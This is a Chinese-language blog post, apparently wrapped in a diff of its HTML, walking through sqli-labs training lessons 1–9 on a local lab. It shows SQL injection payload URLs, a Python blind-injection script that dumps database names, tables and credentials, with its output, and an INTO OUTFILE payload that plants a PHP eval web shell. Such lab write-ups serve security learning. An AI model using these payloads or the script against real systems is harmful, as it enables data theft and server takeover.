@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.37.1" />
+
+  <title>Sqlilabs &middot; BlankのBlog</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://blank233.github.io/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://blank233.github.io/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="https://blank233.github.io/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+ 
+  
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/monokai.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+  <link rel="shortcut icon" href="https://blank233.github.io/img/clover.png" type="image/x-icon" />
+
+  
+  
+
+<script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+  <a class="pure-menu-heading brand" href="https://blank233.github.io/">Menu</a>
+
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://blank233.github.io/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://blank233.github.io/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://blank233.github.io/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://blank233.github.io/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://blank233.github.io/topics/"><i class='fa fa-folder fa-fw'></i>Topics</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://blank233.github.io/tags/"><i class='fa fa-tags fa-fw'></i>Tags</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://weibo.com/6070994053" target="_blank"><i class="fa fa-weibo fa-fw"></i>Weibo</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/blank233" target="_blank"><i class="fa fa-github-square fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+
+  <div>
+  <div class="small-print">
+    <small>&copy; On the way.</small>
+  </div>
+  <div class="small-print">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Sqlilabs</h1>
+  <h2></h2>
+</div>
+
+
+<div class="content">
+
+  <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>30 Mar 2018, 08:50</time>
+  </div>
+
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-folder fa-fw"></i>
+    
+      <a class="post-taxonomy-topic" href="https://blank233.github.iotopics/web">web</a>
+    
+  </div>
+  
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-tags fa-fw"></i>
+    
+      <a class="post-taxonomy-tag" href="https://blank233.github.iotags/2018-03">2018-03</a>
+    
+  </div>
+  
+  
+
+</div>
+
+  <p>sqlilabs还没系统的做过 立个帖子 记录一下</p>
+
+<p></p>
+
+<h2 id="less1">less1</h2>
+
+<p>没啥好说的 单引号闭合</p>
+
+<h2 id="less2">less2</h2>
+
+<p>没啥好说的 整形 可以用2-1测试</p>
+
+<h2 id="less3">less3</h2>
+
+<p>加&rsquo; 报错</p>
+
+<pre><code>Erreur de syntaxe près de ''1'') LIMIT 0,1' à la ligne 1
+''1'') LIMIT 0,1' 最外层单引号表示错误语句，去掉后就是
+'1'') LIMIT 0,1 然后我输入的是1' 而构成的sql语句是'1'') 可以看到1'被')包裹
+也就是'）闭合 其他就没啥
+</code></pre>
+
+<h2 id="less4">less4</h2>
+
+<p>&rdquo;)闭合  判断方式跟3差不多</p>
+
+<h2 id="less5">less5</h2>
+
+<p>这里有一个改变就是，如果查询语句正确就返回you are in&hellip; 不在有其他回显，所以无法使用1-4的方法，而是使用盲注</p>
+
+<p>首先还是判断闭合方式 加一个单引号报错</p>
+
+<pre><code> Erreur de syntaxe près de ''1'' LIMIT 0,1' à la ligne 1
+</code></pre>
+
+<p>可以看到 是&rsquo;闭合</p>
+
+<p>这时候可以先判断一下数据库名字的长度</p>
+
+<pre><code>http://127.0.0.1/sql/Less-5/?id=1%27and%20length(database())=8%23
+</code></pre>
+
+<p>当前数据库为security 长度为8 所以会返回正常</p>
+
+<p>判断数据库第一个字符</p>
+
+<pre><code>http://127.0.0.1/sql/Less-5/?id=1%27and%20left(database(),1)%3E%27a%27%23
+</code></pre>
+
+<p>判断数据库第一位是否大于a 在一般不知道数据库名称的情况下可以使用二分法来提升效率</p>
+
+<p>判断数据库第二个字符</p>
+
+<pre><code>http://127.0.0.1/sql/Less-5/?id=1%27and%20left(database(),2)%3E%27sa%27%23
+</code></pre>
+
+<p>这里是判断第二位是否大于a 以此类推推断出数据库名称</p>
+
+<p>得到数据库名称后就该尝试得到数据表名称</p>
+
+<pre><code>http://127.0.0.1/sql/Less-5/?id=1%27and%20ascii(mid((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27security%27%20limit%200,1),1,1))%3E100%23
+</code></pre>
+
+<p>这里是选择security数据库第一个表的第一个字符的ascii值是否大于100  当然  在这里security可以替换成database() 由于select语句返回的是所有的表名 所以加一个limit限制我们取第一行 也就是第一个表</p>
+
+<p>获取第二个字符只需要将mid函数的第二个参数改成2就好</p>
+
+<pre><code>http://127.0.0.1/sql/Less-5/?id=1%27and%20ascii(mid((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27security%27%20limit%200,1),2,1))%3E100%23
+</code></pre>
+
+<p>获取第二个表的名字我们只需要更改limit的第一个参数即可
+关于limit 第一个参数是起始位置 第二个参数表示偏移量</p>
+
+<pre><code>http://127.0.0.1/sql/Less-5/?id=1%27and%20ascii(mid((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27security%27%20limit%201,1),1,1))%3E100%23
+</code></pre>
+
+<p>然后这样可以获取所有的表名 接下来就要获取列名</p>
+
+<pre><code>http://127.0.0.1/sql/Less-5/?id=1%27and%20ascii(mid((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27limit%201,1),1,1))%3E100%23
+</code></pre>
+
+<p>判断security.users里面第一个列名的第一个字符的ascii是否大于100 判断第二个字符更改mid的参数即可 判断第二个列则更改limit的参数即可 当然 也可以用regexp的方法来匹配</p>
+
+<pre><code>http://127.0.0.1/sql/Less-5/?id=1%27and%201=(select%201%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27%20and%20column_name%20regexp%20%27^use[a-z]%27)%23
+</code></pre>
+
+<p>判断判断security.users里面的列名是否含有use 其中&rsquo;^use[a-z]&lsquo;表示匹配use以及后面跟着1到n个字母的字符串 在本例中 如果将正则改为&rsquo;^username[a-z]&lsquo;则匹配不到</p>
+
+<pre><code>http://127.0.0.1/sql/Less-5/?id=1%27and%201=(select%201%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27%20and%20column_name%20regexp%20%27^username%27)%23
+</code></pre>
+
+<p>判断是否含有username的列 将username更改成password,id亦可以</p>
+
+<p>知道了数据库名，表名，列名  接下来就是喜闻乐见的爆数据了</p>
+
+<pre><code>http://127.0.0.1/sql/Less-5/?id=1%27and%20mid((select%20username%20from%20security.users%20limit%200,1),1,1)%3E%27c%27%23
+</code></pre>
+
+<p>判断security.users里第一个username的第一个值的第一个字符是否大于c 以此类推 第一个值的第二个字符只需更改mid的参数 查询其他值更改limit参数</p>
+
+<p>附less-5的一个盲注脚本 自己写的 感觉已经很精简算法了  但是速度还是不尽人意</p>
+
+<pre><code>import requests
+
+def length_schema():
+    for x in range(1,20):
+        url = 'http://127.0.0.1/sql/Less-5/?id=1%27and%20length(database())='+str(x)+'%23'
+        s = requests.get(url)
+        if &quot;You are in&quot; in s.text:
+            print 'schema_length is :' + str(x)
+            global a
+            a = int(x)
+            schema_name()
+            break
+        
+def schema_name():
+    x = 0
+    name = ''
+    while x &lt; a:
+        x = x + 1
+        temp = 'abcdefghijklmnopqrstuvwxyz0123456789!@$%^&amp;*()_+=-|}{:?&gt;&lt;[];,.`~' 
+        for i in temp:
+            url = 'http://127.0.0.1/sql/Less-5/?id=1%27and%20mid(database(),'+ str(x) +',1)=%27'+str(i)+'%27%23'
+            s = requests.get(url)
+            if &quot;You are in&quot; in s.text:
+                name = name + str(i)
+
+    print 'sechma_name is :' + name
+    global schema_name
+    schema_name = name
+    all()
+
+def all():
+    temp = 'abcdefghijklmnopqrstuvwxyz0123456789!@$%^&amp;*()_+=-|}{:?&gt;&lt;[];,.`~'
+    temp_data = 'abcdefghijklmnopqrstuvwxyz0123456789!@$%^&amp;*()_+=-|}{:?&gt;&lt;[];,.`~ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    for x in xrange(0,20):
+        table_name = ''
+        for y in xrange(1,20):
+            key = 0
+            for i in temp:
+                url = 'http://127.0.0.1/sql/Less-5/?id=1%27and%20ascii(mid((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27'+schema_name+'%27%20limit%20'+str(x)+',1),'+str(y)+',1))=ascii(\''+str(i)+'\')%23'
+                s = requests.get(url)
+                if &quot;You are in&quot; in s.text:
+                    key = 1
+                    table_name = table_name + str(i)
+            if key == 0:
+                break
+        if table_name == '':
+            break
+        print 'one of tables is:' + table_name
+        for p in xrange(0,20):
+            column_name = ''
+            for q in xrange(1,20):
+                key = 0
+                for i in temp:
+                    url_columns = 'http://127.0.0.1/sql/Less-5/?id=1%27and%20ascii(mid((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27'+schema_name+'%27%20and%20table_name=%27'+table_name+'%27limit%20'+str(p)+',1),'+str(q)+',1))=ascii(\''+str(i)+'\')%23'
+                    s = requests.get(url_columns)
+                    if &quot;You are in&quot; in s.text:
+                        key = 1
+                        column_name = column_name + str(i)
+                if key ==0:
+                    break
+            if column_name == '':
+                break
+            print 'a column name of '+table_name+' is '+column_name
+            for y in xrange(0,10):
+                data = ''
+                for z in xrange(1,20):
+                    key = 0
+                    for i in temp_data:
+                        url_data = 'http://127.0.0.1/sql/Less-5/?id=1%27and%20ascii(mid((select%20'+column_name+'%20from%20'+schema_name+'.'+table_name+'%20limit%20'+str(y)+',1),'+str(z)+',1))=ascii(\''+str(i)+'\')%23'
+                        s = requests.get(url_data)
+                        if &quot;You are in&quot; in s.text:
+                            data = data + str(i)
+                            key = 1
+                    if key == 0:
+                        break
+                if data == '':
+                    break
+                print 'one data of '+schema_name+'.'+table_name+'\'s '+column_name+' is '+data
+
+
+length_schema()
+</code></pre>
+
+<p>执行结果</p>
+
+<pre><code>D:\py_test&gt;python ctf.py
+schema_length is :8
+sechma_name is :security
+one of tables is:emails
+a column name of emails is id
+one data of security.emails's id is 1
+one data of security.emails's id is 2
+one data of security.emails's id is 3
+one data of security.emails's id is 4
+one data of security.emails's id is 5
+one data of security.emails's id is 6
+one data of security.emails's id is 7
+one data of security.emails's id is 8
+a column name of emails is email_id
+one data of security.emails's email_id is Dumb@dhakkan.com
+one data of security.emails's email_id is Angel@iloveu.com
+one data of security.emails's email_id is Dummy@dhakkan.local
+one data of security.emails's email_id is secure@dhakkan.loca
+one data of security.emails's email_id is stupid@dhakkan.loca
+one data of security.emails's email_id is superman@dhakkan.lo
+one data of security.emails's email_id is batman@dhakkan.loca
+one data of security.emails's email_id is admin@dhakkan.com
+one of tables is:referers
+a column name of referers is id
+a column name of referers is referer
+a column name of referers is ip_address
+one of tables is:uagents
+a column name of uagents is id
+a column name of uagents is uagent
+a column name of uagents is ip_address
+a column name of uagents is username
+one of tables is:users
+a column name of users is id
+one data of security.users's id is 1
+one data of security.users's id is 2
+one data of security.users's id is 3
+one data of security.users's id is 4
+one data of security.users's id is 5
+one data of security.users's id is 6
+one data of security.users's id is 7
+one data of security.users's id is 8
+one data of security.users's id is 9
+one data of security.users's id is 10
+a column name of users is username
+one data of security.users's username is Dumb
+one data of security.users's username is Angelina
+one data of security.users's username is Dummy
+one data of security.users's username is secure
+one data of security.users's username is stupid
+one data of security.users's username is superman
+one data of security.users's username is batman
+one data of security.users's username is admin
+one data of security.users's username is admin1
+one data of security.users's username is admin2
+a column name of users is password
+one data of security.users's password is Dumb
+one data of security.users's password is Angeline
+one data of security.users's password is Dummy
+one data of security.users's password is secure
+one data of security.users's password is stupid
+one data of security.users's password is superman
+one data of security.users's password is batman
+one data of security.users's password is admin
+one data of security.users's password is admin1
+one data of security.users's password is admin2
+</code></pre>
+
+<h2 id="less6">less6</h2>
+
+<p>&ldquo;闭合  其他跟less5一样</p>
+
+<h2 id="less7">less7</h2>
+
+<p>?id=1 页面返回You are in use into outfile</p>
+
+<p>大概思路就是使用into outfile写一句话木马到服务器上，首先还是判断闭合方式，不在赘述，如果是在实战中或者其他ctf平台上，接下来就是找绝对路径了，本地搭建的平台所以可以忽略这一步，再就是一句话木马要转成16进制格式 payload如下</p>
+
+<pre><code>http://127.0.0.1/sql/Less-7/?id=1%27))union%20select%201,2,0x3c3f70687020406576616c28245f504f53545b2761275d293f3e%20into%20outfile%20%27E:/wamp/wamp/www/sql/Less-7/1.php%27%23
+ps:在win下，路径是\分隔，但是由于是在url中，\会被认定为转义符，所以用/或\\
+</code></pre>
+
+<p>执行后尽管报错了 但是当我们访问1.php的时候还是可以访问的 接下来就可以使用菜刀连接了</p>
+
+<h2 id="less-8">less-8</h2>
+
+<p>还是盲注，使用less-5的payload也是可以的 查看源代码可以看到跟less-5的区别就在于对sql的报错进行了注释，所以无法使用报错注入</p>
+
+<h2 id="less-9">less-9</h2>
+
+<p>看标题可以知道是时间盲注，单引号闭合，先是判断数据库的第一个字符</p>
+
+<pre><code>http://127.0.0.1/sql/Less-9/?id=1%27and%20if(ascii(mid(database(),1,1))=115,sleep(2),1)%23
+</code></pre>
+
+<p>如果数据库第一个字符的ascii值为115，就会sleep两秒，判断第二个字符更改mid函数的第二个参数即可</p>
+
+  
+<div class="prev-next-post pure-g">
+  <div class="pure-u-1-24" style="text-align: left;">
+    
+    <a href="https://blank233.github.io/post/md5%E7%A2%B0%E6%92%9E/"><i class="fa fa-chevron-left"></i></a>
+    
+  </div>
+  <div class="pure-u-10-24">
+    
+    <nav class="prev">
+      <a href="https://blank233.github.io/post/md5%E7%A2%B0%E6%92%9E/">Md5碰撞</a>
+    </nav>
+    
+  </div>
+  <div class="pure-u-2-24">
+    &nbsp;
+  </div>
+  <div class="pure-u-10-24">
+    
+    <nav class="next">
+      <a href="https://blank233.github.io/post/april_plan/">April_plan</a>
+    </nav>
+    
+  </div>
+  <div class="pure-u-1-24" style="text-align: right;">
+    
+    <a href="https://blank233.github.io/post/april_plan/"><i class="fa fa-chevron-right"></i></a>
+    
+  </div>
+</div>
+
+
+
+  
+
+</div>
+
+</div>
+</div>
+<script src="https://blank233.github.iojs/ui.js"></script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-103593285-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+
+
+<script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+
+</body>
+</html>
+
